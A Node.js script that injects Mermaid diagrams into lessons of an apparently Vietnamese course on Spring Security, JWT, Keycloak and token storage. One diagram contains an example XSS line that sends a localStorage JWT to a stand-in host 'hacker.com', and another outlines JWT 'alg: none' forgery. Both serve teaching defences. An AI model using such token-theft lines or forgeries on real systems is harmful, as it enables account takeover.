const fs = require('fs');
const path = require('path');

const modPath = path.join(__dirname, '..', 'js', 'content', 'module5.js');
global.window = { COURSE_MODULES: [], EXPANDED_QUIZZES: {} };
new Function('window', fs.readFileSync(modPath, 'utf8'))(window);

const mod = window.COURSE_MODULES[0];

// Diagram 5-1-2: SecurityFilterChain 15 Filters Flow
const diag_5_1_2 = `
### Sơ Đồ Kiến Trúc: Chuỗi Bộ Lọc Bảo Mật 15 Tầng Của Spring Security 6 (SecurityFilterChain)

\`\`\`mermaid
sequenceDiagram
    autonumber
    actor Client as HTTP Client (Mobile / SPA)
    participant Tomcat as Standard Servlet Container
    participant Delegating as DelegatingFilterProxy
    participant FilterChain as FilterChainProxy (SecurityFilterChain)
    participant Cors as CorsFilter (Xử lý Preflight)
    participant Auth as JwtAuthenticationFilter (Custom)
    participant Authorize as AuthorizationFilter (Kiểm tra quyền)
    participant Dispatcher as DispatcherServlet (Controller)

    Client->>Tomcat: Gửi HTTP Request kèm Bearer Token
    Tomcat->>Delegating: Chuyển giao sang Spring Bean
    Delegating->>FilterChain: Chuyển tiếp vào chuỗi bộ lọc bảo mật
    FilterChain->>Cors: 1. Kiểm tra CORS Headers (Origin, Methods)
    Cors-->>Client: Trả về 200 OK ngay nếu là OPTIONS Preflight
    FilterChain->>Auth: 2. Bóc tách JWT Header, xác thực chữ ký & nạp SecurityContext
    FilterChain->>Authorize: 3. Đánh giá quyền hạn theo URL pattern hoặc @PreAuthorize
    alt Quyền hạn hợp lệ
        Authorize->>Dispatcher: 4. Cho phép vào Controller xử lý đơn hàng
        Dispatcher-->>Client: 200 OK / 201 Created
    else Không có Token / Token hết hạn
        Authorize-->>Client: 401 Unauthorized (RFC 7807)
    else Có Token nhưng không đủ quyền Admin
        Authorize-->>Client: 403 Forbidden (RFC 7807)
    end
\`\`\`
`;

// Diagram 5-1-3: CORS Preflight 403 & Stateless Session Trap
const diag_5_1_3 = `
### Sơ Đồ Cảnh Báo: Lỗi CORS Preflight 403 & Cạm Bẫy Bật Session Trong REST API

\`\`\`mermaid
flowchart TD
    subgraph CorsBug ["CẠM BẪY 1: CORS Preflight OPTIONS Bị Chặn 403"]
        Browser["Trình duyệt Web (React SPA)"] -->|Gửi trước OPTIONS /api/v1/orders| Security["Spring Security"]
        Security -->|Chưa cấu hình cors() hoặc đặt sau auth| Reject["403 Forbidden! Trình duyệt chặn đứng, không bao giờ gửi request POST thật!"]
        Reject -.->|Khắc phục| FixCors["Đặt cors() ở đầu SecurityFilterChain + khai báo rõ AllowedOrigins"]
    end

    subgraph SessionBug ["CẠM BẪY 2: Quên Tắt Session (Không Stateless)"]
        Client["Mobile App"] -->|Gọi API| ServerCluster["Cụm 3 Server Backend (Cân bằng tải Round-Robin)"]
        ServerCluster --> Node1["Server 1: Tạo HttpSession lưu trong RAM máy 1"]
        Client -->|Request tiếp theo rơi vào| Node2["Server 2: Không có session -> Ép login lại!"]
        Node2 -.->|Khắc phục| FixStateless["SessionCreationPolicy.STATELESS: Hoàn toàn không lưu session, tin tưởng vào JWT!"]
    end

    style CorsBug fill:#7c2d12,stroke:#f97316,color:#fff
    style SessionBug fill:#7c2d12,stroke:#f97316,color:#fff
    style FixCors fill:#064e3b,stroke:#10b981,color:#fff
    style FixStateless fill:#064e3b,stroke:#10b981,color:#fff
\`\`\`
`;

// Diagram 5-2-2: JWT Token Rotation with Redis
const diag_5_2_2 = `
### Sơ Đồ Tuần Tự: Cơ Chế Xoay Vòng Token (Refresh Token Rotation) Với Redis Cache

\`\`\`mermaid
sequenceDiagram
    autonumber
    actor Client as Client App (Mobile)
    participant API as Spring Boot Security API
    participant Redis as Redis Cache (Token Store & Blacklist)

    Note over Client,API: GIAI ĐOẠN 1: ĐĂNG NHẬP
    Client->>API: POST /auth/login (email, password)
    API->>Redis: Lưu RefreshToken_A (Hạn 7 ngày)
    API-->>Client: AccessToken_1 (Hạn 15p) + RefreshToken_A

    Note over Client,API: GIAI ĐOẠN 2: LÀM MỚI TOKEN (ROTATION)
    Client->>API: POST /auth/refresh (Gửi kèm RefreshToken_A)
    API->>Redis: Kiểm tra RefreshToken_A có hợp lệ và chưa bị thu hồi?
    Redis-->>API: Hợp lệ
    API->>Redis: 1. Thu hồi và đưa RefreshToken_A vào Blacklist (Đã dùng!)
    API->>Redis: 2. Lưu RefreshToken_B MỚI TINH
    API-->>Client: AccessToken_2 MỚI + RefreshToken_B MỚI
    
    Note over Client,API: NẾU HACKER DÙNG LẠI RefreshToken_A CŨ:
    API->>Redis: Phát hiện RefreshToken_A nằm trong Blacklist!
    API->>Redis: PHÁT HIỆN ĐÁNH CẮP! Xóa toàn bộ token của User đó ngay lập tức!
    API-->>Client: 401 Unauthorized: Bắt buộc đăng nhập lại!
\`\`\`
`;

// Diagram 5-2-3: JWT alg=none Attack & Sensitive Payload Leak
const diag_5_2_3 = `
### Sơ Đồ Tấn Công: Lỗ Hổng Thuật Toán 'none' & Rò Rỉ Dữ Liệu Nhạy Cảm Trong Payload

\`\`\`mermaid
flowchart TD
    subgraph AttackNone ["LỖ HỔNG 1: Giả Mạo Chữ Ký Bằng Thuật Toán 'none'"]
        Hacker["Hacker lấy token người dùng"] --> Modify["Sửa header thành {'alg': 'none', 'typ': 'JWT'}<br/>Sửa payload thành {'role': 'SUPER_ADMIN'}"]
        Modify --> Send["Gửi sang Backend có thư viện JWT lỗi thời"]
        Send --> Vulnerable["Nếu Backend không ép thuật toán HMAC/RSA -> BỎ QUA KIỂM TRA CHỮ KÝ!"]
        Vulnerable --> Compromised["HACKER CHIẾM TOÀN BỘ QUYỀN ADMIN HỆ THỐNG!"]
    end

    subgraph SensitiveLeak ["LỖ HỔNG 2: Nhét Password/CreditCard Vào JWT Payload"]
        Payload["JWT Payload: {'sub': '123', 'card': '4111-2222', 'cvv': '123'}"] --> Base64["JWT chỉ mã hóa Base64URL, KHÔNG HỀ ĐƯỢC MÃ HÓA BẢO MẬT (ENCRYPTION)!"]
        Base64 --> Decode["Bất kỳ ai trên đường truyền đều giải mã đọc được dữ liệu nhạy cảm 100%!"]
    end

    style AttackNone fill:#7c2d12,stroke:#f97316,color:#fff
    style SensitiveLeak fill:#7c2d12,stroke:#f97316,color:#fff
\`\`\`
`;

// Diagram 5-3-1: OAuth2 Resource Server & JWKS Architecture
const diag_5_3_1 = `
### Sơ Đồ Kiến Trúc: OAuth2 Resource Server & Cơ Chế Xác Thực Chữ Ký Bằng JWKS

\`\`\`mermaid
graph TD
    Client["Client App (Mobile / React SPA)"]
    
    subgraph KeycloakIDP ["Keycloak Identity Provider (SSO Server)"]
        KeycloakAuth["Auth Endpoint: /realms/ecommerce/protocol/openid-connect/token"]
        JWKSEndpoint["JWKS Endpoint: /realms/ecommerce/protocol/openid-connect/certs<br/>(Cung cấp Public Keys dạng RSA JSON Web Key Set)"]
    end

    subgraph ResourceServer ["Spring Boot Resource Server (E-Commerce Backend)"]
        NimbusDecoder["NimbusJwtDecoder (Spring Security OAuth2)"]
        LocalCache["JWKS Key Cache (In-Memory, TTL = 24 Giờ)"]
        SecurityContext["SecurityContextHolder (Authenticated Principal)"]
    end

    Client -->|1. Đăng nhập| KeycloakAuth
    KeycloakAuth -->>Client|2. Trả về Signed JWT (Kèm Kid: Key ID)|
    Client -->|3. Gọi API kèm Bearer Token| NimbusDecoder
    NimbusDecoder -->|4. Lấy Public Key giải mã| LocalCache
    LocalCache -.->|Chỉ gọi mạng lần đầu hoặc khi đổi Key| JWKSEndpoint
    NimbusDecoder -->|5. Xác thực chữ ký RSA thành công| SecurityContext

    style KeycloakIDP fill:#1e293b,stroke:#3b82f6,color:#fff
    style ResourceServer fill:#064e3b,stroke:#10b981,color:#fff
\`\`\`
`;

// Diagram 5-3-2: Keycloak Role Conversion Flow
const diag_5_3_2 = `
### Sơ Đồ Luồng: Chuyển Đổi Keycloak Realm Roles Thành Spring GrantedAuthority

\`\`\`mermaid
flowchart LR
    subgraph KeycloakJWT ["Keycloak JWT Token Payload"]
        Claims["realm_access: {<br/>&nbsp;&nbsp;roles: ['ORDER_ADMIN', 'PAYMENT_VIEWER']<br/>}"]
    end

    subgraph CustomConverter ["Custom JwtAuthenticationConverter"]
        Extract["Trích xuất mảng roles từ claim realm_access"]
        MapPrefix["Bổ sung tiền tố: 'ROLE_' + roleName"]
    end

    subgraph SpringSecurityContext ["Spring Security Authorities"]
        Auths["GrantedAuthority:<br/>- ROLE_ORDER_ADMIN<br/>- ROLE_PAYMENT_VIEWER"]
    end

    subgraph MethodSec ["@PreAuthorize Guardrail"]
        Method["@PreAuthorize(\"hasRole('ORDER_ADMIN')\")<br/>public void cancelOrder(String id)"]
    end

    Claims --> Extract
    Extract --> MapPrefix
    MapPrefix --> Auths
    Auths --> Method

    style CustomConverter fill:#1e293b,stroke:#3b82f6,color:#fff
    style MethodSec fill:#064e3b,stroke:#10b981,color:#fff
\`\`\`
`;

// Diagram 5-3-3: JWKS Network Bottleneck Trap
const diag_5_3_3 = `
### Sơ Đồ Cảnh Báo: Nghẽn Mạng Do Không Cache JWKS & Lỗi Lệch Prefix ROLE_

\`\`\`mermaid
flowchart TD
    subgraph JWKSNetworkTrap ["CẠM BẪY 1: Gọi JWKS Endpoint Cho Mọi Request (DoS Keycloak)"]
        Req["1,000 HTTP Requests / Giây Đến Backend"] --> Backend["Resource Server"]
        Backend -->|Mỗi request lại bắn HTTP sang| Keycloak["Keycloak: /certs endpoint"]
        Keycloak --> Crash["Keycloak quá tải, cạn kiệt socket -> SẬP TOÀN BỘ HỆ THỐNG XÁC THỰC!"]
        Crash -.->|Khắc phục| FixCache["Sử dụng CacheableJWKSource với TTL 24h & Stale-while-revalidate"]
    end

    subgraph PrefixTrap ["CẠM BẪY 2: Lỗi Lệch Tiền Tố ROLE_"]
        TokenRole["Token chứa: 'ORDER_ADMIN' (Không có ROLE_)"] --> Check["Spring hasRole('ORDER_ADMIN') tự động tìm 'ROLE_ORDER_ADMIN'"]
        Check --> Fail403["KHÔNG TÌM THẤY! Bị từ chối 403 Forbidden dù tài khoản có quyền!"]
        Fail403 -.->|Khắc phục| FixPrefix["Custom Converter tự động ép tiền tố 'ROLE_'"]
    end

    style JWKSNetworkTrap fill:#7c2d12,stroke:#f97316,color:#fff
    style PrefixTrap fill:#7c2d12,stroke:#f97316,color:#fff
    style FixCache fill:#064e3b,stroke:#10b981,color:#fff
    style FixPrefix fill:#064e3b,stroke:#10b981,color:#fff
\`\`\`
`;

// Diagram 5-4-2: BFF Pattern with HttpOnly Cookie Architecture
const diag_5_4_2 = `
### Sơ Đồ Kiến Trúc: Mô Hình Backend-For-Frontend (BFF) Che Giấu Token Bằng HttpOnly Cookie

\`\`\`mermaid
sequenceDiagram
    autonumber
    actor Browser as Trình Duyệt Web (JavaScript SPA)
    participant BFF as Spring Cloud Gateway (BFF Layer)
    participant Redis as Redis Session / Token Store
    participant Microservice as Order Microservice (Resource Server)

    Browser->>BFF: 1. POST /auth/login (Thông tin đăng nhập)
    BFF->>BFF: Xác thực với Identity Provider
    BFF->>Redis: Lưu JWT Access Token & Refresh Token vào Redis
    BFF-->>Browser: 2. Set-Cookie: SESSION_ID=xyz; HttpOnly; Secure; SameSite=Strict
    Note over Browser: JavaScript KHÔNG THỂ đọc cookie này (Chống 100% XSS Attack!)

    Browser->>BFF: 3. GET /api/orders (Trình duyệt tự đính kèm HttpOnly Cookie)
    BFF->>Redis: Lấy JWT tương ứng với SESSION_ID=xyz
    Redis-->>BFF: Trả về Bearer JWT
    BFF->>Microservice: 4. Gắn Authorization: Bearer JWT vào Header nội bộ
    Microservice-->>BFF: 200 OK (Dữ liệu đơn hàng)
    BFF-->>Browser: 200 OK (Dữ liệu đơn hàng)
\`\`\`
`;

// Diagram 5-4-3: XSS Token Theft Trap
const diag_5_4_3 = `
### Sơ Đồ Tấn Công: Hiểm Họa XSS Đánh Cắp Token Trong LocalStorage

\`\`\`mermaid
flowchart TD
    subgraph XSSTrap ["CẠM BẪY: Lưu JWT Trong Trình Duyệt Bằng LocalStorage"]
        Dev["Developer lưu token: localStorage.setItem('jwt', token)"]
        Hacker["Hacker chèn được mã độc XSS (qua bình luận, avatar, script bên thứ 3)"]
        Hacker --> Steal["Mã độc chạy: fetch('https://hacker.com/steal?t=' + localStorage.getItem('jwt'))"]
        Steal --> AccountTakeover["HACKER CHIẾM TRỌN TÀI KHOẢN VÀ RÚT HẾT TIỀN TRONG VÍ!"]
    end

    subgraph DefenseBFF ["PHÒNG THỦ TUYỆT ĐỐI: HttpOnly Cookie + BFF"]
        Cookie["Lưu trong Cookie HttpOnly"] --> Blocked["document.cookie bị trình duyệt chặn hoàn toàn đối với JavaScript!"]
        Blocked --> Safe["Mã độc XSS bất lực, không thể chạm tới Token!"]
    end

    style XSSTrap fill:#7c2d12,stroke:#f97316,color:#fff
    style DefenseBFF fill:#064e3b,stroke:#10b981,color:#fff
\`\`\`
`;

const injections = {
  '5-1-2': diag_5_1_2,
  '5-1-3': diag_5_1_3,
  '5-2-2': diag_5_2_2,
  '5-2-3': diag_5_2_3,
  '5-3-1': diag_5_3_1,
  '5-3-2': diag_5_3_2,
  '5-3-3': diag_5_3_3,
  '5-4-2': diag_5_4_2,
  '5-4-3': diag_5_4_3,
};

let updatedCount = 0;
mod.lessons.forEach(l => {
  if (injections[l.id] && !l.content.includes('mermaid')) {
    l.content = injections[l.id] + '\n\n' + l.content;
    updatedCount++;
    console.log(`[ENRICHED] ${l.id}: ${l.title}`);
  }
});

// Write back
const outputCode = `/* MODULE 5 — Security: JWT & Keycloak (CES-2026 v2.5 Standardized) */\nwindow.COURSE_MODULES = window.COURSE_MODULES || [];\nwindow.COURSE_MODULES.push(${JSON.stringify(mod, null, 2)});\n`;

fs.writeFileSync(modPath, outputCode, 'utf8');
console.log(`\nHoàn thành bổ sung sơ đồ Mermaid cho Module 5! Số bài cập nhật: ${updatedCount}/9`);
